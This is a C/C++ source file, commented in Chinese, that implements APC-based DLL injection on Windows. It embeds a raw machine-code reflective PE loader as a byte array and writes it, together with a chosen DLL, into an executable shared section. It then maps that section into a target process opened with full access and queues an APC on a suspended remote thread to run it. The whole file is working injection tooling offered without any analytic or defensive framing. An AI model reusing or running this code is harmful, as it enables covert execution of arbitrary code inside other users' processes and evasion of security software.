#include "APC.h"
typedef NTSTATUS(_stdcall *Pfn_ZwMapViewOfSection)(
	HANDLE          SectionHandle,
	HANDLE          ProcessHandle,
	PVOID           *BaseAddress,
	ULONG_PTR       ZeroBits,
	SIZE_T          CommitSize,
	PLARGE_INTEGER  SectionOffset,
	PSIZE_T         ViewSize,
	SECTION_INHERIT InheritDisposition,
	ULONG           AllocationType,
	ULONG           Win32Protect
	);
BYTE PeLoad[2155] = { 85, 139, 236, 129, 236, 4, 0, 0, 0, 199, 69, 252, 0, 0, 0, 0, 255,
117, 8, 232, 6, 0, 0, 0, 233, 72, 8, 0, 0, 144, 131, 236, 104, 141, 68, 36, 16, 83, 85,
86, 87, 80, 232, 79, 5, 0, 0, 139, 116, 36, 124, 102, 129, 62, 77, 90, 116, 12, 95, 94,
93, 51, 192, 91, 131, 196, 104, 194, 4, 0, 139, 94, 60, 3, 222, 137, 92, 36, 24, 129, 59,
80, 69, 0, 0, 116, 12, 95, 94, 93, 51, 192, 91, 131, 196, 104, 194, 4, 0, 139, 75, 80,
139, 83, 52, 106, 4, 104, 0, 32, 0, 0, 81, 82, 255, 84, 36, 56, 139, 248, 133, 255, 137,
124, 36, 16, 117, 38, 139, 67, 80, 106, 4, 104, 0, 32, 0, 0, 80, 87, 255, 84, 36, 56, 133,
192, 137, 68, 36, 16, 117, 10, 95, 94, 93, 91, 131, 196, 104, 194, 4, 0, 139, 124, 36, 16,
106, 20, 106, 0, 255, 84, 36, 60, 80, 255, 84, 36, 80, 139, 232, 106, 4, 106, 8, 137, 125,
4, 199, 69, 12, 0, 0, 0, 0, 255, 84, 36, 60, 80, 255, 84, 36, 80, 137, 69, 8, 199, 69, 16,
0, 0, 0, 0, 139, 75, 80, 106, 4, 104, 0, 16, 0, 0, 81, 87, 255, 84, 36, 56, 139, 83, 84,
106, 4, 104, 0, 16, 0, 0, 82, 87, 255, 84, 36, 56, 139, 78, 60, 139, 123, 84, 3, 207, 139,
248, 139, 209, 193, 233, 2, 243, 165, 139, 202, 131, 225, 3, 243, 164, 139, 76, 36, 124,
139, 81, 60, 139, 76, 36, 16, 3, 194, 141, 84, 36, 76, 137, 69, 0, 82, 137, 72, 52, 232,
83, 4, 0, 0, 139, 69, 0, 139, 85, 4, 51, 201, 137, 84, 36, 28, 102, 139, 72, 20, 102, 131,
120, 6, 0, 199, 68, 36, 20, 0, 0, 0, 0, 141, 76, 1, 24, 15, 134, 151, 0, 0, 0, 141, 89, 16,
235, 4, 139, 84, 36, 28, 131, 59, 0, 117, 54, 139, 68, 36, 24, 139, 112, 56, 133, 246, 126,
93, 139, 75, 252, 106, 4, 104, 0, 16, 0, 0, 3, 202, 86, 81, 255, 84, 36, 100, 139, 206, 139,
248, 139, 209, 51, 192, 193, 233, 2, 137, 123, 248, 243, 171, 139, 202, 131, 225, 3, 243, 170,
235, 50, 139, 75, 252, 139, 3, 106, 4, 104, 0, 16, 0, 0, 3, 202, 80, 81, 255, 84, 36, 100, 139,
11, 139, 115, 4, 139, 124, 36, 124, 139, 209, 3, 247, 139, 248, 193, 233, 2, 243, 165, 139,
202, 131, 225, 3, 243, 164, 137, 67, 248, 139, 77, 0, 139, 68, 36, 20, 51, 210, 64, 102, 139,
81, 6, 131, 195, 40, 59, 194, 137, 68, 36, 20, 15, 140, 114, 255, 255, 255, 139, 92, 36, 24,
139, 68, 36, 16, 139, 75, 52, 43, 193, 137, 68, 36, 124, 116, 127, 141, 68, 36, 76, 80, 232,
124, 3, 0, 0, 139, 69, 0, 139, 125, 4, 5, 160, 0, 0, 0, 137, 124, 36, 28, 139, 72, 4, 133,
201, 118, 95, 139, 8, 139, 4, 57, 3, 207, 133, 192, 118, 84, 141, 28, 56, 139, 65, 4, 131,
232, 8, 51, 246, 169, 254, 255, 255, 255, 141, 81, 8, 118, 54, 51, 192, 102, 139, 2, 139,
248, 129, 231, 0, 240, 255, 255, 129, 255, 0, 48, 0, 0, 117, 13, 139, 124, 36, 124, 37, 255,
15, 0, 0, 3, 195, 1, 56, 139, 65, 4, 70, 131, 232, 8, 131, 194, 2, 209, 232, 59, 240, 114, 206,
139, 124, 36, 28, 3, 73, 4, 139, 1, 133, 192, 119, 172, 141, 76, 36, 76, 81, 232, 253, 2, 0, 0,
139, 69, 0, 139, 93, 4, 5, 128, 0, 0, 0, 137, 92, 36, 124, 139, 72, 4, 133, 201, 15, 134, 219,
0, 0, 0, 139, 48, 106, 20, 3, 243, 86, 137, 116, 36, 28, 255, 84, 36, 100, 133, 192, 15, 133,
196, 0, 0, 0, 235, 8, 139, 116, 36, 20, 139, 92, 36, 124, 139, 70, 12, 133, 192, 15, 132, 175,
0, 0, 0, 3, 195, 80, 255, 84, 36, 84, 139, 248, 131, 255, 255, 15, 132, 197, 0, 0, 0, 139, 85,
12, 139, 77, 8, 141, 4, 149, 4, 0, 0, 0, 80, 81, 106, 8, 255, 84, 36, 108, 80, 255, 148, 36,
132, 0, 0, 0, 133, 192, 137, 69, 8, 15, 132, 157, 0, 0, 0, 139, 85, 12, 137, 60, 144, 139, 85,
12, 66, 137, 85, 12, 139, 6, 133, 192, 116, 11, 139, 118, 16, 3, 216, 3, 116, 36, 124, 235, 7,
139, 70, 16, 3, 216, 139, 243, 139, 3, 133, 192, 116, 48, 169, 0, 0, 0, 128, 116, 8, 37, 255,
255, 0, 0, 80, 235, 9, 139, 76, 36, 124, 141, 84, 8, 2, 82, 87, 255, 84, 36, 112, 133, 192, 137,
6, 116, 79, 139, 67, 4, 131, 195, 4, 131, 198, 4, 133, 192, 117, 208, 139, 68, 36, 20, 106, 20,
131, 192, 20, 80, 137, 68, 36, 28, 255, 84, 36, 100, 133, 192, 15, 132, 62, 255, 255, 255, 85,
232, 82, 0, 0, 0, 139, 69, 0, 131, 196, 4, 139, 64, 40, 133, 192, 116, 46, 139, 76, 36, 16, 3,
193, 133, 192, 116, 11, 106, 0, 106, 1, 81, 255, 208, 133, 192, 117, 18, 85, 232, 58, 1, 0, 0,
95, 94, 93, 51, 192, 91, 131, 196, 104, 194, 4, 0, 199, 69, 16, 1, 0, 0, 0, 95, 139, 197, 94,
93, 91, 131, 196, 104, 194, 4, 0, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 131,
236, 80, 85, 141, 68, 36, 40, 87, 80, 232, 161, 1, 0, 0, 139, 76, 36, 92, 51, 210, 51, 237,
199, 68, 36, 12, 1, 0, 0, 0, 139, 57, 199, 68, 36, 16, 8, 0, 0, 0, 199, 68, 36, 20, 2, 0, 0,
0, 199, 68, 36, 24, 4, 0, 0, 0, 102, 139, 87, 20, 102, 57, 111, 6, 199, 68, 36, 28, 16, 0, 0,
0, 199, 68, 36, 32, 128, 0, 0, 0, 199, 68, 36, 36, 32, 0, 0, 0, 199, 68, 36, 40, 64, 0, 0, 0,
141, 68, 58, 24, 15, 134, 147, 0, 0, 0, 83, 86, 141, 88, 36, 139, 3, 139, 200, 139, 208, 193,
233, 29, 193, 234, 30, 139, 240, 131, 225, 1, 131, 226, 1, 193, 238, 31, 169, 0, 0, 0, 2, 116,
19, 139, 67, 236, 139, 75, 228, 104, 0, 64, 0, 0, 80, 81, 255, 84, 36, 76, 235, 67, 141, 20, 74,
169, 0, 0, 0, 4, 141, 12, 86, 139, 116, 140, 20, 116, 6, 129, 206, 0, 2, 0, 0, 139, 83, 236,
139, 202, 133, 201, 117, 18, 168, 64, 116, 5, 139, 79, 32, 235, 7, 168, 128, 116, 22, 139, 79,
36, 133, 201, 118, 15, 139, 75, 228, 141, 68, 36, 16, 80, 86, 82, 81, 255, 84, 36, 68, 139, 84,
36, 100, 51, 192, 69, 131, 195, 40, 139, 58, 102, 139, 71, 6, 59, 232, 15, 140, 116, 255, 255,
255, 94, 91, 95, 93, 131, 196, 80, 195, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 144,
144, 131, 236, 44, 141, 68, 36, 0, 86, 80, 232, 146, 0, 0, 0, 139, 116, 36, 52, 133, 246, 116,
119, 139, 70, 16, 133, 192, 116, 24, 139, 14, 139, 70, 4, 106, 0, 106, 0, 139, 81, 40, 80, 3,
208, 255, 210, 199, 70, 16, 0, 0, 0, 0, 139, 70, 8, 133, 192, 116, 50, 139, 70, 12, 87, 51,
255, 133, 192, 126, 24, 139, 70, 8, 139, 4, 184, 131, 248, 255, 116, 5, 80, 255, 84, 36, 36,
139, 70, 12, 71, 59, 248, 124, 232, 139, 78, 8, 81, 106, 0, 255, 84, 36, 36, 80, 255, 84,
36, 52, 95, 139, 70, 4, 133, 192, 116, 12, 104, 0, 128, 0, 0, 106, 0, 80, 255, 84, 36, 28,
86, 106, 0, 255, 84, 36, 32, 80, 255, 84, 36, 48, 94, 131, 196, 44, 194, 4, 0, 144, 144,
144, 144, 144, 144, 144, 144, 144, 144, 144, 144, 85, 139, 236, 129, 236, 148, 0, 0, 0,
83, 86, 87, 83, 81, 82, 86, 51, 201, 100, 139, 113, 48, 139, 118, 12, 139, 118, 28, 139,
70, 8, 139, 126, 32, 139, 54, 56, 79, 24, 117, 243, 144, 144, 137, 133, 108, 255, 255,
255, 85, 139, 232, 139, 69, 60, 139, 84, 5, 120, 3, 213, 139, 74, 24, 139, 90, 32, 3, 221,
73, 139, 52, 139, 3, 245, 184, 71, 101, 116, 80, 57, 6, 117, 241, 184, 114, 111, 99, 65,
57, 70, 4, 117, 231, 139, 90, 36, 3, 221, 102, 139, 12, 75, 139, 90, 28, 3, 221, 139, 4,
139, 3, 197, 93, 94, 90, 89, 91, 137, 133, 112, 255, 255, 255, 177, 114, 178, 97, 176, 101,
50, 219, 198, 133, 116, 255, 255, 255, 86, 198, 133, 117, 255, 255, 255, 105, 136, 141,
118, 255, 255, 255, 198, 133, 119, 255, 255, 255, 116, 198, 133, 120, 255, 255, 255, 117,
136, 149, 121, 255, 255, 255, 198, 133, 122, 255, 255, 255, 108, 198, 133, 123, 255, 255,
255, 80, 136, 141, 124, 255, 255, 255, 198, 133, 125, 255, 255, 255, 111, 198, 133, 126, 255,
255, 255, 116, 136, 133, 127, 255, 255, 255, 198, 69, 128, 99, 198, 69, 129, 116, 136, 93, 130,
198, 69, 180, 76, 198, 69, 181, 111, 136, 85, 182, 198, 69, 183, 100, 198, 69, 184, 76, 198, 69,
185, 105, 198, 69, 186, 98, 136, 77, 187, 136, 85, 188, 136, 77, 189, 198, 69, 190, 121, 198, 69,
191, 65, 136, 93, 192, 198, 69, 164, 86, 198, 69, 165, 105, 136, 77, 166, 198, 69, 167, 116, 198,
69, 168, 117, 136, 85, 169, 198, 69, 170, 108, 198, 69, 171, 65, 198, 69, 172, 108, 198, 69, 173,
108, 198, 69, 174, 111, 198, 69, 175, 99, 136, 93, 176, 198, 69, 196, 86, 198, 69, 197, 105, 136,
77, 198, 198, 69, 199, 116, 198, 69, 200, 117, 136, 85, 201, 198, 69, 202, 108, 198, 69, 203, 70,
136, 77, 204, 136, 69, 205, 136, 69, 206, 136, 93, 207, 198, 69, 148, 73, 198, 69, 149, 115, 198,
69, 150, 66, 136, 85, 151, 198, 69, 152, 100, 198, 69, 153, 82, 136, 69, 154, 136, 85, 155, 198,
69, 156, 100, 198, 69, 157, 80, 198, 69, 158, 116, 136, 77, 159, 136, 93, 160, 198, 69, 132, 71,
136, 69, 133, 198, 69, 134, 116, 198, 69, 135, 80, 136, 77, 136, 198, 69, 137, 111, 198, 69, 138,
99, 139, 181, 112, 255, 255, 255, 136, 69, 139, 136, 69, 143, 136, 69, 222, 136, 69, 223, 136, 69,
245, 136, 69, 250, 136, 69, 251, 136, 69, 233, 136, 69, 209, 136, 69, 213, 136, 93, 146, 136, 93,
231, 136, 93, 252, 136, 93, 241, 136, 93, 219, 139, 157, 108, 255, 255, 255, 141, 133, 116, 255,
255, 255, 80, 83, 198, 69, 140, 115, 198, 69, 141, 115, 198, 69, 142, 72, 136, 85, 144, 198, 69,
145, 112, 198, 69, 220, 70, 136, 77, 221, 198, 69, 224, 76, 198, 69, 225, 105, 198, 69, 226, 98,
136, 77, 227, 136, 85, 228, 136, 77, 229, 198, 69, 230, 121, 198, 69, 244, 72, 136, 85, 246, 198,
69, 247, 112, 198, 69, 248, 70, 136, 77, 249, 198, 69, 232, 72, 136, 85, 234, 198, 69, 235, 112,
198, 69, 236, 65, 198, 69, 237, 108, 198, 69, 238, 108, 198, 69, 239, 111, 198, 69, 240, 99, 198,
69, 208, 72, 136, 85, 210, 198, 69, 211, 112, 198, 69, 212, 82, 198, 69, 214, 65, 198, 69, 215,
108, 198, 69, 216, 108, 198, 69, 217, 111, 198, 69, 218, 99, 255, 214, 139, 125, 8, 141, 77, 180,
81, 83, 137, 7, 255, 214, 141, 85, 164, 137, 71, 4, 82, 83, 255, 214, 137, 71, 8, 141, 69, 196, 80,
83, 255, 214, 141, 77, 148, 137, 71, 12, 81, 83, 255, 214, 141, 85, 132, 137, 71, 16, 82, 83, 255,
214, 137, 71, 20, 141, 69, 220, 80, 83, 255, 214, 141, 77, 244, 137, 71, 24, 81, 83, 137, 119, 28,
255, 214, 141, 85, 232, 137, 71, 32, 82, 83, 255, 214, 137, 71, 36, 141, 69, 208, 80, 83, 255, 214,
137, 71, 40, 95, 94, 91, 139, 229, 93, 194, 4, 0, 139, 229, 93, 194, 4, 0 };
Pfn_ZwMapViewOfSection ZwMapViewOfSection = nullptr;
//创建内存镜像
//@parameter DLl文件目录
HANDLE _stdcall CreateWMap(wchar_t *DllPath)
{
	HANDLE hFile = CreateFile(DllPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)return NULL;
	LARGE_INTEGER FileSize = { 0 };
	if (!GetFileSizeEx(hFile, &FileSize))return NULL;
	void *hMalloc = malloc((size_t)FileSize.QuadPart + 1);
	if (!hMalloc) {
		CloseHandle(hFile);
		return NULL;
	}
	ZeroMemory(hMalloc, (size_t)FileSize.QuadPart);
	ReadFile(hFile, hMalloc, (size_t)FileSize.QuadPart, NULL, NULL);
	CloseHandle(hFile);
	size_t PeLoadSize_T = sizeof(PeLoad);
	HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, (DWORD)(PeLoadSize_T + FileSize.QuadPart + 5), L"APCDll");
	if (!hMap) { free(hMalloc); return NULL; }
	void *pAddress = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, NULL, NULL, NULL);
	if (!pAddress) {
		free(hMalloc);
		CloseHandle(hMap);
		return NULL;
	}
	MoveMemory(pAddress, PeLoad, PeLoadSize_T);
	void *pAddress2 = (char*)pAddress + PeLoadSize_T;
	MoveMemory(pAddress2, hMalloc, (size_t)FileSize.QuadPart);
	free(hMalloc);
	UnmapViewOfFile(pAddress);
	return hMap;
}
/*创建APC镜像线程
@parameter 进程名
@parameter 镜像句柄
*/
HANDLE _stdcall CreateAPC(wchar_t *ProcessName, HANDLE hMap)
{
	ZwMapViewOfSection = (Pfn_ZwMapViewOfSection)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "ZwMapViewOfSection");
	if (!ZwMapViewOfSection) {
		CloseHandle(hMap);
		return FALSE;
	}
	DWORD Pid = ProcessName2Pid(ProcessName);
	HANDLE HProcess = OpenProcess(PROCESS_ALL_ACCESS, NULL, Pid);
	if (!HProcess) { CloseHandle(hMap); return FALSE; }
	PVOID VAddress = NULL;
	SIZE_T Vsize = NULL;
	NTSTATUS status = ZwMapViewOfSection(hMap, HProcess, &VAddress, NULL, NULL, NULL, &Vsize, ViewShare, NULL, PAGE_EXECUTE_READWRITE);
	if (!NT_SUCCESS(status)) {
		CloseHandle(hMap);
		CloseHandle(HProcess);
		return FALSE;
	}
	LPVOID Thread = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "GetModuleHandleA");
	HANDLE hRemoteThread = CreateRemoteThread(HProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)Thread, NULL, CREATE_SUSPENDED, NULL);
	LPVOID pAddr = (char*)VAddress + sizeof(PeLoad);
	DWORD hProc = QueueUserAPC((PAPCFUNC)VAddress, hRemoteThread, (ULONG_PTR)pAddr);
	CloseHandle(HProcess);
	return hRemoteThread;
}
/*APC进程注入
@parameter 进程名
@parameter Dll文件目录
*/
BOOL _stdcall APCInject(wchar_t *ProcessName, wchar_t *DllPath)
{
	HANDLE hMap = CreateWMap(DllPath);
	if (!hMap)return FALSE;
	HANDLE hRemoteThread = CreateAPC(ProcessName, hMap);
	ResumeThread(hRemoteThread);
	CloseHandle(hMap);
	CloseHandle(hRemoteThread);
	return TRUE;
}